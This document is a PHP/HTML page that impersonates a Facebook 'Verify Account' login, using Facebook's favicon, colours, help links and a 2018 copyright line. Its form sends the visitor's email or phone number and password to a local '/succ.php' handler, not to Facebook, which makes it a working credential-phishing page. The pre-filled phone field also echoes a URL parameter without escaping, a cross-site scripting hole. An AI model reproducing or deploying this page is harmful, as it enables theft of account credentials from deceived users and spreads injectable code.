<!DOCTYPE html>
<html>
  <head>
    <title>Verify Account  |  Facebook</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
    <style>
      html, body {margin: 0; padding: 0; background-color: #ecedf2; color: #5e5e5e; font-family: 'Roboto', sans-serif;}
      #header {width: 100vw; height: 8vh; background-color: #3a5896;}
      #header img {position: relative; height: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%);}
      #form {width: 85vw; margin-left: auto;margin-right: auto; margin-top: 5vh;}
      #form p:nth-of-type(1) {font-family: 'Roboto', sans-serif;}
      #form input {width: 94%; -webkit-appearance: none; border: 0px; border-radius: 0; margin-left: 0; margin-bottom: 0px; font-size: 2.5vh; padding-top: 2vh; padding-bottom: 2vh;padding-left: 3vw; margin-top: 0; border: 1px solid #cbccd0;}
      #form input:nth-of-type(1) {border-top-right-radius: 5px; border-top-left-radius: 5px;}
      #form input:nth-of-type(2) {border-bottom-left-radius: 5px; border-bottom-right-radius: 5px;}
      #form input:nth-of-type(3) {border: 0; background-color: #3876e3; width: 100%; color: white; margin-top: 3vh; border-radius: 6px; font-weight: bold;}
      #form p:nth-of-type(2) {color: #8d97bb; display: inline; float: left; position: relative; left: 50%; transform: translateX(-50%); margin-top: 3vh;}
      #form p:nth-of-type(2) span {color: #5e5e5e;}
      a {text-decoration: none; color: #8d97bb}
      #copy {display: block; float: left; position: absolute; bottom: 0%; font-size: 2vh; left: 50%; transform: translateX(-50%);}
    </style>
  </head>

  <body>
    <div id="header">
      <img src="media/logo.png">
    </div>
    <div id="form">
      <p>Please log-in to verify your account</p>
      <form action="/succ.php" method="post" id="realform">
        <input type="text" name="phone" placeholder="Email or Phone" value="<?php echo $_GET['phone'];?>"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <input type="submit" value="Log In">
      </form>
      <p><a href="https://www.facebook.com/login/identify?ctx=recover&lwv=110&ars=royal_blue_bar">Forgot Password?</a> <span>•</span> <a href="https://www.facebook.com/help/">Help Center</a></p><br>
      <p id="copy">Facebook © 2018</p>
    </div>
  </body>
</html>
